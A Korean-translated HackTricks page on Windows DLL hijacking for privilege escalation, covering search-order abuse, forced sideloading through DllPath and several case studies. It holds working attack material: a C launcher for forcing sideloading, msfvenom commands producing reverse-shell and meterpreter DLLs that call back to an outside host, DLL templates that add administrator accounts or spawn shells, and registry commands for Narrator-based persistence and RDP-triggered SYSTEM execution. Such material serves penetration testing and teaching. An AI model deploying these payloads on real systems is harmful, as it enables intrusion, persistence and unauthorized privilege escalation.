# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking은 신뢰되는 애플리케이션이 악성 DLL을 로드하도록 조작하는 것을 포함합니다. 이 용어는 **DLL Spoofing, Injection, and Side-Loading** 같은 여러 전술을 포괄합니다. 주로 코드 실행, 지속성 확보, 그리고 드물게 권한 상승에 사용됩니다. 여기서는 권한 상승에 초점을 맞추었지만, 목적이 달라도 hijacking 방법 자체는 일관됩니다.

### Common Techniques

DLL hijacking에는 애플리케이션의 DLL 로드 전략에 따라 각기 다른 효과를 가진 여러 방법이 사용됩니다:

1. **DLL Replacement**: 실제 DLL을 악성 DLL로 교체하며, 원본 DLL의 기능을 유지하기 위해 DLL Proxying을 선택적으로 사용합니다.
2. **DLL Search Order Hijacking**: 악성 DLL을 정당한 DLL보다 먼저 검색되는 경로에 배치하여 애플리케이션의 검색 패턴을 악용합니다.
3. **Phantom DLL Hijacking**: 애플리케이션이 필요로 하는 존재하지 않는 DLL로 인식하게 하여 악성 DLL을 로드하도록 만듭니다.
4. **DLL Redirection**: `%PATH%` 또는 `.exe.manifest` / `.exe.local` 파일 같은 검색 매개변수를 수정해 애플리케이션이 악성 DLL을 가리키게 합니다.
5. **WinSxS DLL Replacement**: WinSxS 디렉터리에서 정식 DLL을 악성 DLL로 대체하는 방법으로, 종종 DLL side-loading과 관련됩니다.
6. **Relative Path DLL Hijacking**: 복사된 애플리케이션과 함께 사용자가 제어하는 디렉터리에 악성 DLL을 배치하는 방법으로, Binary Proxy Execution 기법과 유사합니다.

## Finding missing Dlls

시스템 내부에서 누락된 DLL을 찾는 가장 일반적인 방법은 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) (sysinternals)를 실행하고, 다음 두 필터를 **설정**하는 것입니다:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

그런 다음 **File System Activity**만 표시하십시오:

![](<../../../images/image (153).png>)

일반적인 누락된 dll을 찾고 있다면 이 상태로 몇 초 동안 실행해 두면 됩니다.\
특정 실행 파일 내부의 누락된 dll을 찾고 있다면 "Process Name" "contains" `<exec name>` 같은 추가 필터를 설정하고, 실행한 뒤 이벤트 캡처를 중지해야 합니다.

## Exploiting Missing Dlls

권한 상승을 위해 우리가 가질 수 있는 가장 좋은 기회는 권한이 높은 프로세스가 로드하려고 시도할 DLL을 쓸 수 있는 위치에 그 DLL을 쓸 수 있는 경우입니다. 따라서 DLL이 원본 DLL이 있는 폴더보다 먼저 검색되는 폴더에 쓸 수 있거나(이상한 케이스), DLL이 검색되는 어떤 폴더에 쓸 수 있고 원본 DLL이 어떤 폴더에도 존재하지 않는 경우에 악용할 수 있습니다.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows 애플리케이션은 미리 정의된 검색 경로 집합을 따라 DLL을 찾으며 특정 순서를 준수합니다. 악성 DLL을 이러한 디렉터리 중 하나에 전략적으로 배치하여 정식 DLL보다 먼저 로드되게 하면 DLL hijacking 문제가 발생합니다. 이를 방지하는 한 가지 방법은 애플리케이션이 필요한 DLL을 참조할 때 절대 경로를 사용하게 하는 것입니다.

다음은 32-bit 시스템에서의 DLL 검색 순서입니다:

1. 애플리케이션이 로드된 디렉터리.
2. 시스템 디렉터리. 이 디렉터리의 경로를 얻으려면 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 함수를 사용하세요.(_C:\Windows\System32_)
3. 16-bit 시스템 디렉터리. 이 디렉터리의 경로를 얻는 함수는 없지만 검색됩니다. (_C:\Windows\System_)
4. Windows 디렉터리. 이 디렉터리의 경로를 얻으려면 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 함수를 사용하세요. (_C:\Windows_)
5. 현재 디렉터리.
6. PATH 환경 변수에 나열된 디렉터리. 여기에는 **App Paths** 레지스트리 키로 지정된 애플리케이션별 경로가 포함되지 않는다는 점에 유의하세요. **App Paths** 키는 DLL 검색 경로를 계산할 때 사용되지 않습니다.

이것이 **SafeDllSearchMode**가 활성화된 기본 검색 순서입니다. 이 기능이 비활성화되면 현재 디렉터리가 두 번째 위치로 올라갑니다. 이 기능을 비활성화하려면 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 레지스트리 값을 만들고 0으로 설정하세요(기본값은 활성화됨).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 함수가 **LOAD_WITH_ALTERED_SEARCH_PATH** 플래그로 호출되면 검색은 **LoadLibraryEx**가 로드하는 실행 모듈의 디렉터리에서 시작됩니다.

마지막으로, DLL이 이름만이 아니라 절대 경로로 지정되어 로드될 수도 있다는 점을 유의하세요. 그런 경우 해당 DLL은 그 경로에서만 검색됩니다(만약 그 DLL이 의존성을 가지고 있다면, 의존성은 이름으로 로드된 것으로 간주되어 일반 검색 규칙으로 검색됩니다).

검색 순서를 변경하는 다른 방법들도 있지만 여기서는 설명하지 않겠습니다.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

새로 생성된 프로세스의 DLL 검색 경로에 결정적으로 영향을 주는 고급 방법은 ntdll의 네이티브 API로 프로세스를 생성할 때 RTL_USER_PROCESS_PARAMETERS의 DllPath 필드를 설정하는 것입니다. 여기에서 공격자가 제어하는 디렉터리를 제공하면, 대상 프로세스가 절대 경로를 사용하지 않고(또는 안전 로드 플래그를 사용하지 않고) 이름으로 임포트된 DLL을 해석할 때 해당 디렉터리에서 악성 DLL을 로드하도록 강제할 수 있습니다.

핵심 아이디어
- RtlCreateProcessParametersEx로 프로세스 매개변수를 빌드하고 DllPath에 공격자가 제어하는 폴더(예: 드로퍼/언패커가 위치한 디렉터리)를 제공합니다.
- RtlCreateUserProcess로 프로세스를 생성합니다. 대상 바이너리가 이름으로 DLL을 해석할 때 로더는 이 제공된 DllPath를 참조하여 신뢰할 수 있는 sideloading을 가능하게 합니다. 이 방식은 악성 DLL이 대상 EXE와 동일한 위치에 있지 않아도 동작합니다.

노트/제한사항
- 이는 생성되는 자식 프로세스에 영향을 미치며 현재 프로세스에만 영향을 주는 SetDllDirectory와는 다릅니다.
- 대상은 이름으로 DLL을 임포트하거나 LoadLibrary로 로드해야 합니다(절대 경로가 아니고 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories를 사용하지 않아야 함).
- KnownDLLs와 하드코딩된 절대 경로는 hijack할 수 없습니다. 포워딩된 내보내기(forwarded exports)와 SxS는 우선순위를 변경할 수 있습니다.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Windows 문서의 DLL 검색 순서 예외

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### 권한 상승

**요구사항**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

네, 조건을 찾는 것은 까다롭습니다 — **기본적으로 권한이 높은 실행 파일에서 DLL이 없는 경우를 찾는 것은 이상한 일**이고, **시스템 경로 폴더에 대한 쓰기 권한을 갖는 것은 더더욱 이상한 일**입니다(기본적으로는 불가능합니다). 하지만 misconfigured 환경에서는 가능합니다.\
만약 운이 좋아 요구사항을 충족하는 경우, [UACME](https://github.com/hfiref0x/UACME) 프로젝트를 확인해 보세요. 프로젝트의 **main goal of the project is bypass UAC**가 주 목적이지만, 해당 Windows 버전에서 사용할 수 있는 **PoC**의 Dll hijaking이 있을 수 있습니다(아마도 쓰기 권한이 있는 폴더 경로만 변경하면 될 것입니다).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
그리고 **PATH 내 모든 폴더의 권한을 확인하세요**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
다음 명령으로 executable의 imports와 dll의 exports를 확인할 수도 있습니다:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
다음에서 System Path 폴더에 쓰기 권한이 있을 때 **Dll Hijacking을 악용하여 권한을 상승시키는** 전체 가이드를 확인하세요:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 자동화 도구

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)는 system PATH 내의 어떤 폴더에 쓰기 권한이 있는지 확인합니다.\
이 취약점을 발견하는 데 유용한 다른 자동화 도구로는 **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ 및 _Write-HijackDll._가 있습니다.

### 예제

공격 가능한 시나리오를 찾았다면, 이를 성공적으로 악용하기 위해 가장 중요한 것 중 하나는 **실행 파일이 해당 dll로부터 가져올 모든 함수들을 최소한으로 export하는 dll을 생성하는 것**입니다. 어쨌든, Dll Hijacking은 [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) 또는 [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)로 권한을 상승시키는 데 유용합니다.  
실행을 위한 dll hijacking에 중점을 둔 이 연구에서 **유효한 dll을 생성하는 방법**의 예제를 찾을 수 있습니다: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
또한, 다음 섹션에서는 **기본 dll 코드** 몇 가지를 찾아볼 수 있으며, 이는 **템플릿**으로 사용하거나 **필요하지 않은 함수들을 export한 dll**을 만들 때 유용할 수 있습니다.

## **Dll 생성 및 컴파일**

### **Dll 프록시화**

기본적으로 **Dll proxy**는 로드될 때 **악성 코드를 실행**할 수 있으면서도, 모든 호출을 실제 라이브러리로 중계하여 **예상대로 노출되고 동작**하는 Dll입니다.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 또는 [**Spartacus**](https://github.com/Accenture/Spartacus) 같은 도구를 사용하면 실제로 **프로시파이하려는 실행파일을 지정하고 라이브러리를 선택**하여 proxified dll을 생성하거나 **Dll을 지정**하여 proxified dll을 생성할 수 있습니다.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) 얻기:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**사용자 생성 (x86 — x64 버전은 보지 못했습니다):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 자신만의

참고: 몇몇 경우에는 컴파일한 Dll이 victim process에 의해 로드될 여러 함수를 반드시 **export several functions** 해야 합니다. 이러한 함수들이 존재하지 않으면 **binary won't be able to load** 하고 **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL 예제 (사용자 생성 포함)</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>스레드 진입점을 가진 대체 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 사례 연구: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe는 시작 시 예측 가능한 언어별 localization DLL을 검사(probe)하며, 이를 통해 arbitrary code execution and persistence가 가능하다.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- 사용자 컨텍스트 (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 위 설정으로 Narrator를 시작하면 심어둔 DLL이 로드됩니다. 보안 데스크탑(로그온 화면)에서는 CTRL+WIN+ENTER를 눌러 Narrator를 시작하세요.

RDP-triggered SYSTEM execution (lateral movement)
- 클래식 RDP 보안 레이어 허용: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- 호스트에 RDP로 접속한 후, 로그온 화면에서 CTRL+WIN+ENTER를 눌러 Narrator를 실행하면 보안 데스크탑에서 SYSTEM으로 DLL이 실행됩니다.
- RDP 세션이 종료되면 실행이 중단됩니다 — 신속히 inject/migrate 하세요.

Bring Your Own Accessibility (BYOA)
- 내장된 Accessibility Tool (AT) 레지스트리 항목(예: CursorIndicator)을 복제하여 임의의 binary/DLL을 가리키도록 편집하고 가져온 다음 `configuration`을 해당 AT 이름으로 설정할 수 있습니다. 이렇게 하면 Accessibility 프레임워크 하에서 임의 실행을 프록시할 수 있습니다.

Notes
- `%windir%\System32` 아래에 쓰기 및 HKLM 값을 변경하려면 관리자 권한이 필요합니다.
- 모든 페이로드 로직은 `DLL_PROCESS_ATTACH`에 넣을 수 있으며, exports가 필요하지 않습니다.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 공격 흐름

1. 표준 사용자로서 `hostfxr.dll`을 `C:\ProgramData\Lenovo\TPQM\Assistant\`에 드롭합니다.
2. 예약된 작업이 현재 사용자 컨텍스트에서 오전 9:30에 실행될 때까지 기다립니다.
3. 작업이 실행될 때 관리자가 로그인한 상태라면, 악성 DLL이 관리자 세션에서 medium integrity로 실행됩니다.
4. 표준 UAC bypass techniques를 연결하여 medium integrity에서 SYSTEM 권한으로 상승시킵니다.

## 사례 연구: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

위협 행위자들은 종종 MSI-based droppers와 DLL Side-Loading을 결합하여 신뢰된 서명된 프로세스 하에서 페이로드를 실행합니다.

체인 개요
- 사용자가 MSI를 다운로드합니다. GUI 설치 중(예: LaunchApplication 또는 VBScript action) CustomAction이 백그라운드에서 조용히 실행되어 임베디드 리소스에서 다음 단계를 재구성합니다.
- dropper가 합법적으로 서명된 EXE와 악성 DLL을 동일한 디렉터리에 씁니다 (예: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- 서명된 EXE가 시작되면 Windows DLL search order가 작업 디렉터리에서 먼저 wsc.dll을 로드하여 공격자 코드를 서명된 상위 프로세스 하에서 실행합니다 (ATT&CK T1574.001).

MSI 분석 (찾아볼 것)
- CustomAction 테이블:
- 실행 파일 또는 VBScript를 실행하는 항목을 찾으세요. 의심스러운 패턴 예: LaunchApplication이 백그라운드에서 임베디드 파일을 실행함.
- Orca (Microsoft Orca.exe)에서 CustomAction, InstallExecuteSequence 및 Binary 테이블을 검사합니다.
- MSI CAB 내에 임베디드/분할된 페이로드:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- VBScript CustomAction에 의해 연결(concatenated)되고 복호화되는 여러 개의 작은 조각들을 찾아보세요. 일반적인 흐름:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
wsc_proxy.exe를 이용한 실전 sideloading
- 다음 두 파일을 동일한 폴더에 놓으세요:
- wsc_proxy.exe: 정식 서명된 호스트(Avast). 프로세스는 자신의 디렉토리에서 이름으로 wsc.dll을 로드하려고 시도합니다.
- wsc.dll: 공격자 DLL. 특정한 exports가 필요 없다면 DllMain으로 충분합니다; 그렇지 않다면 proxy DLL을 만들고 필요한 exports를 원본 라이브러리로 전달(forward)하면서 DllMain에서 payload를 실행하세요.
- 최소한의 DLL payload를 빌드하세요:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- 내보내기 요구사항의 경우, 프록시 프레임워크(예: DLLirant/Spartacus)를 사용하여 페이로드도 실행하는 포워딩 DLL을 생성하세요.

- 이 기술은 호스트 바이너리에 의한 DLL 이름 해석에 의존합니다. 호스트가 절대 경로나 안전 로딩 플래그(예: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories)를 사용하면 hijack이 실패할 수 있습니다.
- KnownDLLs, SxS, 및 forwarded exports는 우선순위에 영향을 줄 수 있으므로 호스트 바이너리와 export 집합을 선택할 때 고려해야 합니다.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
